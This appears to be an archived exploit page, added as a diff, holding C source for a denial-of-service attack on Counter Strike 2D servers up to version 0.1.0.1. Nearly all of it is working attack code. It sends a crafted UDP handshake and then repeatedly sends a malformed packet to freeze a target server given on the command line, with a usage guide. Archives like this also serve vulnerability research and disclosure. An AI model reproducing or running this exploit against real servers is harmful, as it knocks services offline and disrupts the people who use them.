@@ -1,0 +1,133 @@
+<html>
+<head>
+<title>Counter Strike 2D <= 0.1.0.1 Denial of Service Vulnerability</title>
+<pre>
+/*
+  Counter Strike 2D DoS
+  Affected versions: 0.1.0.1 and prior
+  CS2D Developer: http://www.cs2d.com/
+
+  by Iman Karim (iman.karim@smail.inf.fh-bonn-rhein-sieg.de)
+  http://home.inf.fh-rhein-sieg.de/~ikarim2s/
+
+  Written in Borland C++ Builder 6
+  20.09.2005
+*/
+#include &lt;winsock.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;conio.h&gt;
+int sd;
+int port = 36963;
+WSADATA wsadata;
+struct  sockaddr_in p;
+
+const static unsigned char MakeCon[]=   &quot;\xFA\xFA\x0D\x0A&quot;
+                                        &quot;\x68\x61\x72\x72\x79&quot; //Player Name = Harry (in Hex)
+                                        &quot;\xCE\x7B\xE2\x45\x63\x90\x00\x00&quot;;
+const static unsigned char DoSPack[]=   &quot;\xFA\x04&quot;
+                                        &quot;\x68\x61\x72\x72\x79&quot; //Player Name again
+                                        &quot;\x0D\x0A\x02&quot; ;
+
+//----------------------------------------------------------------------
+u_int resolveaddr(char  *host )
+{
+    u_int ip;
+    struct hostent *hIP ;
+
+    ip = inet_addr(host);
+       hIP = gethostbyname(host);
+        if(!hIP) {
+            printf(&quot;Cant solve hostip =&gt; quitting...\n&quot;);
+            return(0);
+        }
+        else ip = *(u_int *)hIP-&gt;h_addr;
+    return(ip);
+}
+
+
+
+bool HandShake(int sd)
+{
+        sendto(sd, MakeCon, 22, 0,(struct sockaddr *)&amp;p, sizeof(p));
+        return true;
+}
+
+bool DoSAttack(int sd)
+{
+        sendto(sd, DoSPack, 10, 0, (struct sockaddr *)&amp;p, sizeof(p));
+        return true;
+}
+//----------------------------------------------------------------------
+
+
+
+int main(int argc, char *argv[])
+{
+        printf (&quot;Counter Strike 2D DoS\n&quot;);
+        printf (&quot;Affected versions: 0.1.0.1 and prior\n&quot;);
+        printf (&quot;by Iman Karim (iman.karim@smail.inf.fh-bonn-rhein-sieg.de)\n&quot;);
+        printf (&quot;http://home.inf.fh-rhein-sieg.de/~ikarim2s/\n-----------\n&quot;);
+        if (argc &lt;= 1)
+        {
+                printf (&quot;\n-Quick Guide-\n\n&quot;);
+                printf (&quot;%s &lt;SRV_IP&gt; [SRV_PORT] [PACKET_COUNT]\n&quot;,argv[0]);
+                printf (&quot;Default Port is 36963\n&quot;);
+                printf (&quot;Default Packet Count is 5000\n&quot;);
+                printf (&quot;\n-           -\n\nPress a key...&quot;);
+                getch();
+                printf (&quot;\n&quot;);
+                return(0);
+        }
+
+        WSAStartup(MAKEWORD (1,0), &amp;wsadata);
+        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+
+        if(sd &lt; 0)
+        {
+         printf (&quot;Cant create socket =&gt; quitting...\n&quot;);
+         return(0);
+        }
+
+        if(argc &gt; 2) port = atoi(argv[2]);
+
+        p.sin_addr.s_addr = resolveaddr(argv[1]);
+        p.sin_port        = htons(port);
+        p.sin_family      = AF_INET;
+
+        printf (&quot;Attacking %s:%i...\n&quot;,argv[1],port);
+        printf (&quot;+Attack started...\n&quot;);
+
+        printf (&quot;++Sending Handshake...\n&quot;);
+        HandShake(sd);
+        unsigned char   rbuf[1024];
+        ZeroMemory(rbuf, 1024);
+        int cnt=0;
+
+        int pcount = 5000;
+        if(argc &gt; 2) pcount = atoi(argv[3]);
+        printf(&quot;\n\n[!!!] IF THE SERVER DON'T RESPONSE PRESS CTRL+C [!!!]\n\n&quot;);
+        for(int i=0;i&lt;=pcount;i++){
+                printf(&quot;+++Sending packet nr.%i...\n&quot;,i);
+                int len=recvfrom(sd, rbuf, sizeof(rbuf), 0, NULL, NULL);
+                if (len &gt; 0)
+                {
+                        printf(&quot;+++(%i)Server Responsed\n&quot;,i);
+                        printf(&quot;+++(%i)Sending DoS Packet\n&quot;,i);
+                        DoSAttack(sd);
+                }
+
+        }
+
+        printf(&quot;++Attack Done!\n&quot;);
+        printf(&quot;+Server should be frozen...\n&quot;);
+        printf(&quot;Done =&gt; quitting.\npress any key...\n&quot;);
+
+        getch();
+        return 0;
+
+}
+
+// milw0rm.com [2005-12-11]
+</pre>
+</html>
+
